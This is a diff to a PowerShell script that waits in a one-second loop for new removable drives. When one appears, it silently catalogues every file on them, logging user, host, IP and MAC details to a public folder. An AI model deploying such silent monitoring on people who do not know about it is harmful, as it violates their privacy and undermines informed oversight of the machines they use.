@@ -1,7 +1,11 @@
-﻿$ErrorActionPreference = 'silentlycontinue'
+$drive = ((Get-PSDrive -PSProvider FileSystem | Where-Object name -ne "C" | select root).root).count
+do {
+if (((Get-PSDrive -PSProvider FileSystem | Where-Object name -ne "C" | select root).root).count -ne $drive)
+{
+$ErrorActionPreference = 'silentlycontinue'
 $IP = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.netadapter.status -ne "Disconnected"}).ipv4address.ipaddress
 $MAC = (Get-NetAdapter | where-object -FilterScript {$_.HardwareInterface -eq "True" -and $_.Status -ne "Disconnected"}).MacAddress
-$aroot = (get-psdrive | where-object { [char[]]"CELSTW" -notcontains $_.Name -AND $_.Provider.Name -eq "FileSystem"} | select root).root
+$aroot = (get-psdrive -PSProvider FileSystem |Where-Object name -ne "C" | select root).root
 foreach ($root in $aroot)
 {
 foreach ($file in (Get-ChildItem $root -file -recurse))
@@ -19,6 +23,12 @@ $mdatetime = ($file | select LastWriteTime).LastWriteTime
 $mdatetime = get-date $mdatetime -format yyyy-MM-dd@HH:mm:ss
 $mdate = $mdatetime.split("@")[0]
 $mtime = $mdatetime.split("@")[1]
-$env:userdomain+ ":::;" + $env:COMPUTERNAME + ":::;" + $IP + ":::;" + $MAC + ":::;" + $env:username + ":::;" +  $cdate + ":::;" + $ctime + “ :“ + $adate + ":::;" + $atime + “ :“ + $mdate + “ :“ + $mtime + “ :“ + "{0:N2}" -f ($file.length/1kb) + ":::;" + $rootd + ":::;" + $file.directoryname + ":::;" + $file.name + ":::;" + $file.basename + ":::;" + $file.extension + ":::;" + $file.attributes | Out-File  C:\Users\Public\Documents\${MAC}_$(get-date -f yyyyMMddHH)_localfiles_noC.txt -Append -Encoding utf8
+$env:userdomain + ":::;" + $env:COMPUTERNAME + ":::;" + $IP + ":::;" + $MAC + ":::;" + $env:username + ":::;" +  $cdate + ":::;" + $ctime + “ :“ + $adate + ":::;" + $atime + “ :“ + $mdate + “ :“ + $mtime + “ :“ + "{0:N2}" -f ($file.length/1kb) + ":::;" + $rootd + ":::;" + $file.directoryname + ":::;" + $file.name + ":::;" + $file.basename + ":::;" + $file.extension + ":::;" + $file.attributes | Out-File C:\Users\Public\Documents\${MAC}_$(get-date -f yyyyMMddHH)_localfiles_noC.txt -Append -Encoding utf8
 }
 }
+$drive = ((Get-PSDrive -PSProvider FileSystem | Where-Object name -ne "C" | select root).root).count
+}
+sleep 1
+}
+
+While ($true)
